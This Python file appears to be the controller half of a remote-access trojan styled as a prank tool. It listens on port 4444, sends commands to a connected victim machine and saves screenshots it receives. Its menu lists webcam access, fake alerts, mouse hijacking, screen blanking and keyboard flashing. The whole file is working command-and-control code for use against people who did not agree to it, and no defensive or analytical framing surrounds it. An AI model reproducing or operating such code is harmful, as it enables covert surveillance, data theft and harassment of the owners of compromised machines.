import socket
import struct
from colorama import Fore, init
import time
import os

init()

SERVER = ""
PORT = 4444

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER, PORT))
s.listen(1)

def title():
    os.system('clear || cls')
    print(
        f'''{Fore.LIGHTWHITE_EX}
▄▄▄█████▓ ██▀███   ▒█████   ██▓     ▒█████    ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▓██▒    ▒██▒  ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒▒██░    ▒██░  ██▒░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░▒██░    ▒██   ██░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░░██████▒░ ████▓▒░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
  ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
    ░      ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░  ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
  ░        ░░   ░ ░ ░ ░ ▒    ░ ░   ░ ░ ░ ▒  ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
            ░         ░ ░      ░  ░    ░ ░        ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
        '''.replace("█", f"{Fore.LIGHTWHITE_EX}█{Fore.LIGHTBLUE_EX}")
     )
HELP_MENU = f"""
{Fore.LIGHTWHITE_EX}====={Fore.LIGHTBLUE_EX} Commands{Fore.LIGHTWHITE_EX} =====
msgbox      {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Show a fake alert message
open_cd     {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Open and close CD tray
beep        {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Play random beep sounds
screenshot  {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Start a screenshot
mouse       {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Crazy Mouse
screen      {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Turn off the screen and then turn it back on
flash       {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Flash Screen
webcam      {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Say hello to the camera
robot       {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Talking robot
notepad     {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Menacing Notepad
led         {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Makes the keyboard flash
sos         {Fore.BLUE}-{Fore.LIGHTWHITE_EX} SOS keyboard

{Fore.LIGHTWHITE_EX}====={Fore.LIGHTBLUE_EX} Other{Fore.LIGHTWHITE_EX} =====
help        {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Show this menu
quit        {Fore.BLUE}-{Fore.LIGHTWHITE_EX} Close connection
"""

while True:
    print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Listening on {Fore.BLUE}{SERVER}:{PORT}')

    client, addr = s.accept()
    print(f'{Fore.BLUE}[+]{Fore.LIGHTWHITE_EX} Client connected: {Fore.LIGHTCYAN_EX}{addr}')
    client.send('Connected to server'.encode())
    time.sleep(3)
    title()

    while True:
        cmd = input(f'{Fore.LIGHTWHITE_EX}root~/{Fore.LIGHTBLUE_EX}{SERVER}{Fore.LIGHTWHITE_EX}# ').strip()
        if not cmd:
            continue

        if cmd.lower() == "help":
            print(HELP_MENU)
            continue

        client.send(cmd.encode())

        if cmd.lower() in ['q', 'quit', 'exit']:
            break

        data_size = struct.unpack(">I", client.recv(4))[0]
        result = b""
        while len(result) < data_size:
            result += client.recv(1024)

        if cmd == "screenshot":
            with open("screenshot.png", "wb") as f:
                f.write(result)
        else:
            print(result.decode(errors="ignore"))

    client.close()

    if input('Wait for new client? (y/n) ') in ['n', 'no']:
        break

s.close()
